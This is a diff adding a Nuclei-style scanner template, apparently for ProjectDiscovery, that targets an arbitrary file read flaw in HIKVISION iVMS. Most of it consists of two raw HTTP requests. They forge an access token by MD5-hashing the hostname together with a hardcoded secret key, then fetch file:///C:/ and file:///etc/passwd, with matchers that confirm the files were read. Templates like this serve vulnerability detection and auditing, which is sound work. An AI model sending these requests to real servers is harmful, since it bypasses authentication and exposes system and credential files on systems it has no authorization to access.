@@ -1,0 +1,32 @@
+id: hikvision-ivms-file-read
+info:
+  name: HIKVISION iVMS Arbitrary File Reading Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    HIKVISION iVMS integrated security management platform has an arbitrary file reading vulnerability. Attackers can read directory information and sensitive files on the server by sending a crafted HTTP request.
+  classification:
+    cvss-score: 9.8
+    cwe-id: CWE-22
+  tags: directory-traversal,file-read
+http:
+  - raw:
+      - |
+        GET /eps/api/triggerSnapshot/download?token={{md5(concat(Hostname, "/eps/api/triggerSnapshot/downloadsecretKeyIbuilding")) | to_upper}}&fileUrl=file:///C:/&fileName=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Program Files"
+        part: body
+  - raw:
+      - |
+        GET /eps/api/triggerSnapshot/download?token={{md5(concat(Hostname, "/eps/api/triggerSnapshot/downloadsecretKeyIbuilding")) | to_upper}}&fileUrl=file:///etc/passwd&fileName=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:"  
+        part: body
